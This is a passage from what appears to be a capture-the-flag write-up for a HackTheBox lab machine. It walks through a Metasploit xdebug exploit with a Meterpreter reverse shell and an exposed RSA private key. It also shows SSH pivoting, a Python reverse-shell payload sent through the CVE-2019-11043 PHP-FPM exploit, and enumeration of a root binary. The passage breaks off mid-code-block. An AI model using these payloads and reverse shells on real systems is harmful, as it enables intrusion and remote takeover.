<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(unix/http/xdebug_unauth_exec) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/http/xdebug_unauth_exec):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   PATH     /vpn/login.php   <span class="built_in">yes</span>       Path to target webapp</span><br><span class="line">   Proxies                   no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS   172.20.0.10      <span class="built_in">yes</span>       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;file:&#x27;</span></span><br><span class="line">   RPORT    80               <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">   SRVHOST  0.0.0.0          <span class="built_in">yes</span>       Callback host <span class="keyword">for</span> accepting connections</span><br><span class="line">   SRVPORT  9000             <span class="built_in">yes</span>       Port to listen <span class="keyword">for</span> the debugger</span><br><span class="line">   SSL      <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   VHOST                     no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  tun9             <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  9001             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line">msf6 exploit(unix/http/xdebug_unauth_exec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 172.30.0.9:9001</span><br><span class="line">[*] 172.20.0.10:80 - Waiting <span class="keyword">for</span> client response.</span><br><span class="line">[*] 172.20.0.10:80 - Receiving response</span><br><span class="line">[*] 172.20.0.10:80 - Shell might take upto a minute to respond.Please be patient.</span><br><span class="line">[*] 172.20.0.10:80 - Sending payload of size 2026 bytes</span><br><span class="line">[*] Sending stage (39282 bytes) to 172.30.0.1</span><br><span class="line">[*] Meterpreter session 2 opened (172.30.0.9:9001 -&gt; 172.30.0.1:53424) at 2021-06-21 00:56:43 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 381 created.</span><br><span class="line">Channel 0 created.</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br></pre></td></tr></table></figure>

<p>And inside &#x2F;home&#x2F;www-data&#x2F;.ssh we got the id_rsa of www-data user so let’s use ssh for more stable shell.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/home/www-data/.ssh</span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">total 20</span><br><span class="line">drwx------ 2 www-data www-data 4096 Jun 14 07:54 .</span><br><span class="line">drwxr-x--- 4 www-data www-data 4096 Jun 14 08:02 ..</span><br><span class="line">-rw-r--r-- 1 www-data www-data  390 Jun 14 07:54 authorized_keys</span><br><span class="line">-rw------- 1 www-data www-data 1675 Jun 14 07:34 id_rsa</span><br><span class="line">-rw-r--r-- 1 www-data www-data  390 Jun 14 07:34 id_rsa.pub</span><br><span class="line"><span class="built_in">cat</span> id_rsa</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEowIBAAKCAQEA0pNa5qwGZ+DKsS60GPhNfCqZti7z1xPzxOTXwtwO9uYzZpq/</span><br><span class="line">nrhzgJq0nQNVRUbaiZ+H6gR1OreDyjr9YorV2kJqccscBPZ59RAhttaQsBqHkGjJ</span><br><span class="line">QEHYKteL1D+hJ80NDd7fJTtQgzT4yBDwrVKwIUSETMfWgzJ5z24LN5s/rcQYgl3i</span><br><span class="line">VKmls3lsod8ilakdDoYEYt12L4ST/exEoVl0AyD9y8m651q40k1Gz4WzPnaHAlnj</span><br><span class="line">mL6CANfiNAJoc8WnqZN5ruSrWhmivmDbKLlDCO5bCCzi2zMHJKqQkcBxdWk60Qhi</span><br><span class="line">17UJMV3mKVQRprvpeTR2jCMykH81n2KU46doSQIDAQABAoIBAADCHxWtkOhW2uQA</span><br><span class="line">cw2T91N3I86QJLiljb8rw8sj17nz4kOAUyhTKbdQ102pcWkqdCcCuA6TrYhkmMjl</span><br><span class="line">pXvxXAvJKXD3dkZeTNohEL4Dz8mSjuJqPi9JDWo6FHrTL9Vg26ctIkiUChou2qZ9</span><br><span class="line">ySAWqCO2h3NvVMpsKBwjHU858+TASlo4j03FJOdmROmUelcqmRimWxgneHBAHEZj</span><br><span class="line">GqDuPjmPmw7pbThqlETyosrbaB3rROzUp9CKAHzYB1BvOTImDsb6qQ+GdKwewAQf</span><br><span class="line">j60myPuxl4qgY8O2yqLFUH3/ovtPTKqHJSUFBO23wzS1qPLupzu1GVXwlsdlhRWA</span><br><span class="line">Amvx+AECgYEA6OOd9dgqXR/vBaxDngWB6ToVysWDjO+QsjO4OpFo7AvGhMRR+WpK</span><br><span class="line">qbZyJG1iQB0nlAHgYHEFj4It9iI6NCdTkKyg2UzZJMKJgErfgI0Svkh/Kdls23Ny</span><br><span class="line">gxpacxW3d2RlyAv4m2hG4n82+DsoPcN+6KxqGRQxWywXtsBsYkRb+wkCgYEA53jg</span><br><span class="line">+1CfGEH/N2TptK2CCUGB28X1eL0wDs83RsU7Nbz2ASVQj8K0MlVzR9CRCY5y6jcq</span><br><span class="line">te1YYDiuFvT+17ENSe5fDtNiF1LEDfp45K6s4YU79DMp6Ot84c2fBDIh8ogH0D7C</span><br><span class="line">CFdjXCI3SIlvc8miyivjRHoyJYJz/cO94DsTE0ECgYA1HlWVEWz4OKRoAtaZYGA1</span><br><span class="line">Ng5qZYqPxsSWIL3QfgIUdMse1ThtTxUgiICYVmqmfP/d/l+TH7RI+0RIc54a7y1c</span><br><span class="line">PkOhzKlqfQSnwmwgAg1YYWi/vtvZYgeoZ4Zh4X4rOTcN3c0ihTJFzwZWsAeJruFv</span><br><span class="line">aIP6nGR1iyUNhe4yq6zfIQKBgANYQNAA2zurgHeZcrMUqsNdefXmB2UGPtKH9gGE</span><br><span class="line">yhU9tMRReLeLFbWAfJj2D5J2x3xQ7cIROuyxBPr58VDGky2VTzRUo584p/KXwvVy</span><br><span class="line">/LaJiVM/BgUCmhxdL0YNP2ZUxuAgeAdM0/e52time8DNkhefyLntlhnqp6hsEqtR</span><br><span class="line">zzXBAoGBANB6Wdk/X3riJ50Bia9Ai7/rdXUpAa2B4pXARnP1/tw7krfPM/SCMABe</span><br><span class="line">sjZU9eeOecWbg+B6RWQTNcxo/cRjMpxd5hRaANYhcFXGuxcg1N3nszhWDpHIpGr+</span><br><span class="line">s5Mwc3oopgv6gMmetHMr0mcGz6OR9KsH8FvW1y+DYY3tUdgx0gau</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p>let’s login with ssh now</p>
<p>But it’s doesn’t work on default ssh port.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/static]</span><br><span class="line">└─<span class="comment"># mousepad id_rsa_www-data</span></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/static]</span><br><span class="line">└─<span class="comment"># chmod 600 id_rsa_www-data </span></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/static]</span><br><span class="line">└─<span class="comment"># ssh -i id_rsa_www-data www-data@10.10.10.246</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;10.10.10.246 (10.10.10.246)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:JT8cPLAcOoDDuERFqP/Ap/sGDqquy6BK/8fkFO2QFJc.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>10.10.10.246<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">www-data@10.10.10.246&#x27;</span>s password: </span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/static]</span><br><span class="line">└─<span class="comment"># ssh -i id_rsa_www-data www-data@10.10.10.246 -p 2222</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;[10.10.10.246]:2222 ([10.10.10.246]:2222)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:SO5uMKk4fPWk/kDc0dLD5Uf7dlyIes4r6s26waZlxkQ.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>[10.10.10.246]:2222<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.19.0-16-amd64 x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/advantage</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This system has been minimized by removing packages and content that are</span></span><br><span class="line"><span class="string">not required on a system that users do not log into.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">To restore this content, you can run the &#x27;</span>unminimize<span class="string">&#x27; command.</span></span><br><span class="line"><span class="string">Last login: Sat Jun 26 04:17:44 2021 from 10.10.14.127</span></span><br><span class="line"><span class="string">www-data@web:~$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">www-data@web:~$ whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br><span class="line"><span class="string">www-data@web:~$ cat user.txt</span></span><br><span class="line"><span class="string">cat: user.txt: No such file or directory</span></span><br><span class="line"><span class="string">www-data@web:~$ ls</span></span><br><span class="line"><span class="string">www-data@web:~$ pwd</span></span><br><span class="line"><span class="string">/home/www-data</span></span><br><span class="line"><span class="string">www-data@web:~$ cd ..</span></span><br><span class="line"><span class="string">www-data@web:/home$ cat user.txt </span></span><br><span class="line"><span class="string">f7f8154a785fe452b1da61b75d72cce8</span></span><br></pre></td></tr></table></figure>

<p>Let’s try with custom port of ssh 2222 which we see inside nmap scan.</p>
<p>And we got the user.txt</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2007.jpg"></li>
</ul>
<h3 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h3><p>If you see on the Support Portal we have another network of ip(192.168.254.3).</p>
<p>And if we see inside our ssh Connection we are in the same network on eth1 interface.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">www-data@web:/home$ ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.20.0.10  netmask 255.255.255.0  broadcast 172.20.0.255</span><br><span class="line">        ether 02:42:ac:14:00:0a  txqueuelen 0  (Ethernet)</span><br><span class="line">        RX packets 3037  bytes 399264 (399.2 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 2520  bytes 352660 (352.6 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">eth1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.254.2  netmask 255.255.255.0  broadcast 192.168.254.255</span><br><span class="line">        ether 02:42:c0:a8:fe:02  txqueuelen 0  (Ethernet)</span><br><span class="line">        RX packets 59  bytes 5838 (5.8 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 21  bytes 2874 (2.8 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 412  bytes 21630 (21.6 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 412  bytes 21630 (21.6 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>

<p>let’s do port forwarding with ssh so we can access the network</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/static]</span><br><span class="line">└─<span class="comment"># ssh -L 80:192.168.254.3:80 www-data@10.10.10.246 -p2222 -i id_rsa_www-data</span></span><br><span class="line">Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.19.0-16-amd64 x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">This system has been minimized by removing packages and content that are</span><br><span class="line">not required on a system that <span class="built_in">users</span> <span class="keyword">do</span> not <span class="built_in">log</span> into.</span><br><span class="line"></span><br><span class="line">To restore this content, you can run the <span class="string">&#x27;unminimize&#x27;</span> <span class="built_in">command</span>.</span><br><span class="line">Last login: Sat Jun 26 10:24:36 2021 from 10.10.14.5</span><br><span class="line">www-data@web:~$</span><br></pre></td></tr></table></figure>

<p>Now let’s go to localhost or 127.0.0.1 and we got the page.</p>
<p>There is nothing on the website just saying batch mode: &#x2F;usr&#x2F;bin&#x2F;ersatool…</p>
<p>And if we check the header we see PHP-FPM&#x2F;7.1 is running let’s check the exploit for that.</p>
<ul>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9tZWRpdW0uY29tL0Brbm93bnNlYzQwNHRlYW0vcGhwLWZwbS1yZW1vdGUtY29kZS1leGVjdXRpb24tdnVsbmVyYWJpbGl0eS1jdmUtMjAxOS0xMTA0My1hbmFseXNpcy0zNWZkNjA1ZGQyZGM=">PHP-FPM Remote Code Execution Vulnerability (CVE-2019–11043) Analysis<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZU1pZGRsZUJsdWUvQ1ZFLTIwMTktMTEwNDM=">CVE-2019-11043 poc<i class="fa fa-external-link-alt"></i></span></p>
</li>
</ul>
<p>After reading the article i understand that how to exploit this and get rev shell.</p>
<h4 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h4><p>Git clone the repo and get the exploit.py file and delete the directory.</p>
<h4 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h4><p>create simple script to make things easy.</p>
<p>luci.py</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">&#x27;/usr/bin/python3.6 -c \&#x27;</span>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;<span class="number">192.168</span>.<span class="number">254.2</span>&quot;,<span class="number">9001</span>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)\<span class="string">&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">r = requests.get(<span class="string">&quot;http://192.168.254.3/index.php?a=&quot;</span>+payload)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<h4 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h4><p>Download the nc binary.</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0g3NE4vbmV0Y2F0LWJpbmFyaWVzL2Jsb2IvbWFzdGVyL25j">nc<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h4 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h4><p>Put all 3 files in one folder and transfer them with scp.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/static]</span><br><span class="line">└─<span class="comment"># scp -P 2222 -i id_rsa_www-data nc www-data@10.10.10.246:/tmp/nc</span></span><br><span class="line">nc                                                                                              100%  762KB 119.0KB/s   00:06    </span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/static]</span><br><span class="line">└─<span class="comment"># scp -P 2222 -i id_rsa_www-data 2019-11043-exploit.py www-data@10.10.10.246:/tmp/exploit.py</span></span><br><span class="line">2019-11043-exploit.py                                                                           100% 4280    12.0KB/s   00:00    </span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/static]</span><br><span class="line">└─<span class="comment"># scp -P 2222 -i id_rsa_www-data luci.py www-data@10.10.10.246:/tmp/luci.py</span></span><br><span class="line">luci.py</span><br></pre></td></tr></table></figure>

<p>Now open 2 ssh Connections and start netcat listner on 9001 in one of the ssh connection.</p>
<p>After start the netcat listner run the exploit.py</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www-data@web:/tmp$ python3 exploit.py --url http://192.168.254.3/index.php </span><br><span class="line">[*] QSL candidate: 1754, 1759, 1764</span><br><span class="line">[*] Target seems vulnerable (QSL:1754/HVL:220): PHPSESSID=6d483f623d1874f92a3042afbb704e76; path=/</span><br><span class="line">[*] RCE successfully exploited!</span><br><span class="line"></span><br><span class="line">    You should be able to run commands using:</span><br><span class="line">    curl http://192.168.254.3/index.php?a=bin/ls+/</span><br></pre></td></tr></table></figure>

<p>After running the exploit you got the url. we don’t need to open that url because we create a script for that so they open that and add the python3 exploit and we got the rev shell.</p>
<p>We just need to run the dedsec.py for 2-3 times and we got the shell.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">www-data@web:/tmp$ ./nc -lvp 9001</span><br><span class="line">listening on [any] 9001 ...</span><br><span class="line">192.168.254.3: inverse host lookup failed: ���fy</span><br><span class="line">connect to [192.168.254.2] from (UNKNOWN) [192.168.254.3] 46410</span><br><span class="line">www-data@pki:~/html$ <span class="built_in">whoami</span></span><br><span class="line">www-data</span><br><span class="line">www-data@pki:~/html$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line">www-data@pki:~/html$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">index.php  uploads</span><br></pre></td></tr></table></figure>

<p>Now if you remember we see a file called ersatool on web page. Let’s check that file.</p>
<p>After checking that file i known that it’s a binary which running as root.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@pki:~/html$ <span class="built_in">ls</span> -al  /usr/bin/ersatool</span><br><span class="line"><span class="built_in">ls</span> -al  /usr/bin/ersatool</span><br><span class="line">-rwxr-xr-x 1 root root 22496 Jun 21 17:05 /usr/bin/ersatool</span><br><span class="line">www-data@pki:~/html$ file /usr/bin/ersatool</span><br><span class="line">file /usr/bin/ersatool</span><br><span class="line">/usr/bin/ersatool: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=961368a18afcdeccddd1f423353ff104bc09e6ae, not stripped</span><br></pre></td></tr></table></figure>

<p>And after some enumeration i found the source code that file.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@pki:~/html$ find / -name ersatool.* 2&gt;/dev/null</span><br><span class="line">find / -name ersatool.* 2&gt;/dev/null</span><br><span class="line">/usr/src/ersatool.c</span><br></pre></td></tr></table></figure>

<p>source code of ersatool binary.</p>
<ul>
<li>ersatool.c</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span 